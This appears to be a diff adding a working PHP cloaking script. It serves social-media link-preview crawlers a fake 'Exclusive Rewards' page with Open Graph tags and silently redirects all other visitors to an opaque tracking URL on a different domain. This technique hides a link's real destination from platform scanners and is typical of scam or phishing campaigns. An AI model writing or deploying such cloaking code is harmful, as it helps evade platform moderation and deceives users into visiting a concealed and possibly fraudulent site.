@@ -1,0 +1,28 @@
+<?php
+$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
+
+$isBot = preg_match('/facebookexternalhit|MetaInspector|Twitterbot|LinkedInBot|WhatsApp/i', $userAgent);
+
+if ($isBot) {
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset="UTF-8">
+        <title>Special Offer & Rewards</title>
+        <meta property="og:title" content="Exclusive Rewards & Updates">
+        <meta property="og:description" content="Click here to check out the latest updates and details.">
+        <meta property="og:image" content="https://i.ibb.co/7Jk5gR2w/In-Shot-20260917-223602739.jpg">
+        <meta property="og:url" content="https://ff.urlxx347.com/?utm_source=Bullet&utm_medium=Saraiki">
+        <meta property="og:type" content="website">
+    </head>
+    <body>
+        <h1>Loading...</h1>
+    </body>
+    </html>
+    <?php
+} else {
+    header("Location: https://ff.urlxx347.com/?utm_source=Bullet&utm_medium=Saraiki");
+    exit();
+}
+?>
